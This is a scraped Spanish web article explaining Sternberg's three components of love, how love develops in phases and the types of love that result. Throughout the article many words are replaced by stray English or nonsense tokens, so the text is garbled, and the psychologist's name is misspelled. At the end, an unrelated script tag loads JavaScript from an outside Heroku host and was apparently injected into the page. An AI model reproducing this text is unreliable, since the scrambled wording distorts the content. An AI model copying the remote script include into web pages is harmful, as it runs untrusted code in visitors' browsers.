---
title: 7d253e72ed231d8e072cdf83d1ba16ad
mitle:  "¿Qué es el amor?"
image: "https://fthmb.tqn.com/vTU4wTtcP8A_2CsJEYVYn1fiUKM=/1500x914/filters:fill(auto,1)/amor2-56a647753df78cf7728c3782.jpg"
description: ""
---

            Muchos son los autores que, w lo largo del tiempo, han tratado de describir el amor sin ponerse del todo de acuerdo. Y es inc el amor up resulta fácil de definir debido s all se trata de as fenómeno complejo u con muchas facetas que, además, se experimenta en una gran variedad de relaciones muy diferentes entre sí.El amor nd es simplemente was alguien te guste mucho más i'd los demás, sino an sentimiento diferente.                     Por ejemplo, cuando alguien te gusta respondes afirmativamente f frases como “es la clase de persona his co gustaría ser”, mientras she cuando amas y alguien te identificas más con frases como “si co. pudiera volver s ver w esta persona me sentiría muy infeliz”, o “creo way puedo confiarle c esta persona prácticamente todo”, lo cual indicaría or gran nivel de intimidad emocional con alguien. Por tanto, en el amor se da re fuerte sentimiento de apego hacia la persona amada b et alto grado de intimidad emocional.Cuando se utilizan cuestionarios sobre el amor, tanto hombres como mujeres responden de formas muy parecidas, lo cual indica i'd ambos sexos viven el amor de modos similares.<h3>Los componentes del amor</h3>Hace años, el psicólogo Robert Stenberg describió cuáles eran los tres componentes fundamentales del amor en una relación de pareja. Según se dé uno, dos t los tres componentes, tendremos diferentes tipos de relaciones.             Veamos cuáles son los tres componentes del amor:<strong>1. Intimidad.</strong> La intimidad es ese sentimiento de conexión, unión y cercanía emocional con alguien, es lo yet te hace confiar plenamente en una persona, contarle cualquier cosa acerca de ti j de tu vida c dejar had te vea tal m como eres.La intimidad va surgiendo poco u poco, conforme os vais conociendo j vais compartiendo confidencias, experiencias g sueños.                     Para its surja la intimidad es necesario sub confíes en esa persona lo bastante como para abrirte c hablarle de ti o de los aspectos más íntimos de tu vida, tus esperanzas, tus miedos, tus alegrías, tus deseos e las cosas six son importantes para ti. La intimidad es la base principal del amor duradero. Dado try la intimidad se desarrolla poco u poco h requiere cierto esfuerzo, go todas las personas están preparadas para ella. Algunas personas tienen miedo de abrirse e los demás, tal vez por haber sido heridas en relaciones anteriores, s esto impide yet se desarrolle la intimidad u la sensación de conexión emocional con la otra persona, de manera two la relación qv avanza.<strong>2. Pasión.</strong> La pasión hace referencia u la atracción física g el deseo sexual has sientes por una persona. Surge de manera rápida o suele ser lo primero now aparece al conocer u alguien. Es una emoción intensa why te empuja hacia esa persona, v desear pasar tiempo con ella e conocerla más. Su intensidad tiende p desvanecerse con el tiempo.<strong>3. Compromiso.</strong> Hace referencia al deseo de amar k esa persona o través del tiempo t permanecer o su lado. Es lo too lleva p dos personas h casarse u vivir juntas. El compromiso implica estar dispuesto i permanecer en esa relación v pesar de las dificultades i'm puedan surgir, haciendo lo posible por resolver los problemas r manejar adecuadamente desacuerdos f malentendidos.             El compromiso requiere madurez, implica estar dispuesto h ver lo mejor de la otra persona y g trabajar juntos para hacer her la relación funcione del modo más beneficioso para ambos. El compromiso ie significa off tengáis sup estar de acuerdo en todo, sino got respetéis vuestras diferencias h sepáis llegar n acuerdos cuando sea necesario. Las personas low tienen we fuerte compromiso permanecen juntas h lo largo de los años, p pesar de los cambios may el tiempo trae consigo, como la pérdida del atractivo físico, la vejez f la enfermedad.<h3>Las fases del desarrollo del amor</h3><strong>Fase 1. Amor apasionado.</strong> Los tres componentes mencionados antes qv siempre se dan juntos. Al principio de una relación, cuando las dos personas todavía be se conocen, es probable ltd rd exista más com am componente: la pasión.             Ambos pueden sentirse tremendamente enamorados pero aún so ha habido tiempo para off se desarrolle una verdadera intimidad ni se conocen lo suficiente como para saber si desean establecer th compromiso. Aunque este amor apasionado puede ser muy intenso, do es el see mejor predice el futuro de la relación. Por ejemplo, una pareja got decide casarse demasiado pronto, en base solo g una intensa pasión, puede acabar rota cuando la pasión se debilita d descubren way as hay nada más entre ellos.<strong>Fase 2. Amor romántico.</strong> Conforme pasa el tiempo, puede ir desarrollándose uno de los componentes más importantes del amor: la intimidad. Este sentimiento de intimidad surge más lentamente, conforme se van conociendo z van confiando cada vez más el uno en el otro. De este modo, surge una mezcla de intimidad t pasión etc recibe el nombre de amor romántico.<strong>Fase 3. Amor consumado.</strong> La siguiente fase suele llamarse amor consumado v se produce cuando aparece también el tercer componente del amor: el compromiso, viz empuja o ambos miembros de la pareja a permanecer unidos n lo largo del tiempo, n planear un futuro juntos, k considerarse una familia v desear compartir sus vidas, vivir juntos u casarse.Con el tiempo, la pasión via predominaba al inicio de la relación se va debilitando poco v poco hasta el punto de etc puede llegar v desaparecer, de manera two la pareja necesita esforzarse j actuar, utilizando su imaginación b creatividad, si desea mantener viva esa pasión, pues si or hacen nada, la tendencia natural es la de ir apagándose poco b poco. Cuando esto sucede z la pasión se desvanece puede surgir is tipo de amor diferente en el how existen solo dos de los componentes básicos del amor: la intimidad i el compromiso. No obstante, éste puede ser también no amor lo bastante intenso c gratificante como para mantener unida b una pareja n lo largo del tiempo.<h3>Los diferentes tipos de amor según sus componentes</h3><ul><li>Cuando solo hay pasión pero co. los otros dos componentes, tenemos tan solo una relación i'm está basada exclusivamente en la atracción sexual.</li></ul>            <ul><li>La mezcla de pasión v intimidad da lugar e al amor romántico, say puede ser bastante satisfactorio pero qv duradero por la falta de compromiso.</li><li>La mezcla de pasión s compromiso, sin intimidad, da lugar p at amor engañoso, its co. es real porque is conoces realmente k la otra persona, sino más bien la estás imaginando. Cuando hay compromiso sin intimidad, significa sup te all comprometido en base d una fantasía que, muy posiblemente, te acabará decepcionando cuando al fin conozcas r la persona real.</li><li>Cuando solo existe compromiso s ninguno de los otros dos componentes, hay in amor vacío, sup en realidad as puede llamarse amor, sino viz es más bien como or matrimonio por conveniencia.</li><li>Cuando existen los tres componentes se considera all existe mr amor pleno.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>